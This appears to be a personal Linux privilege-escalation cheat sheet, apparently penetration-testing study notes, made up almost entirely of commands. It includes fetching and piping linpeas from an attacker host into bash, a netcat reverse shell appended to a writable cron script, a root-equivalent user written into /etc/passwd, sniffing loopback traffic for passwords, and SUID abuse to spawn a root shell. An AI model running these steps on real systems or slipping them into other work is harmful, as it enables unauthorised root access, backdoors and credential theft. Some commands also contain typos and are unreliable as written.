GO FOR AUTOMATION AND LOWEST HANGING FRUIT FIRST

curl -L http:/<myip>/linpeas.sh | bash

OR

wget http://<myip>/linpeas.exe pee.exe

wget http://unix-privesc-check standard > output.txt


ENUMERATION AND SITUATIONAL AWARENESS

sudo -l

uname -a

hostname

cat /etc/passwd

ps aux -- system processes

ip a -- similar to ipconfig /all

routel -- similar to routeprint

ss -anp -- shows open ports

cat /etc/iptables/rules.v4 -- might be able to find a hidden open port.

ls -lah /etc/cron* -- lists all cronjobs

sudo crontab -l -- Crontab is used by sysadmins to add their own cronjobs

dpkg -l -- find all installed applications

find / -writable -type d 2>/dev/null -- finds any file your user can write to

find / -perm -u=s -type f 2>/dev/null -- finds files that anyone can run with sudo privs


1. Download and run linpeas for quick low hanging fruit with lots of information.




EXPOSED CREDENTIAL INFORMATION



env -- Sometimes sysadmins store credentials in environments.

cat .bashrc -- Can potentially find variables that are set during launch of shell.

watch -n 1 "ps -aux | grep pass" -- watch running processes, look for cred dump.

sudo tcpdump -i lo -A | grep "pass" -- extremely nice to run with sudo privs. will dump creds.



INSECURE FILE PERMISSIONS


grep "CRON" /var/log/syslog -- shows running cronjobs

cat /home/joe/.scripts/user_backups.sh -- view running crobjob AND ls -lah /home/joe/.scripts/user_backups.sh -- see if you have write access.

Use this script to overwrite cronjob.

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <myip> <my port) >/tmp/f" >> user_backups.sh

If you have write access to /etc/passwd/ you can write a password hash into the file and it will take precedence over the /etc/shadows file.

1. openssl passwd w00t

2. echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

3. su root2



INSECURE SYSTEM COMPONENTS


find / -perm -u=s -type f 2>/dev/null -- finds cmds with suid but set. Can be exploited to run processes as root.

for ex if you have find suid bit  set -- find /home/joe/Desktop -exec "/usr/bin/bash" -p \;

/usr/sbin/getcap -r / 2>/dev/null -- finds binaries with suid capabilities set.

sudo -l -- shows cmds user can run with sudo privs.

Search GTFObins for either binary with suid capabilties or cmds that can be run with sudo or cmds with suid bit set for quick exploitation

Run the following three commands to enum linux versioning and then combine into a searchsploit cmd.

1. cat /etc/issue

2. uname -r

3. arch

4. searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
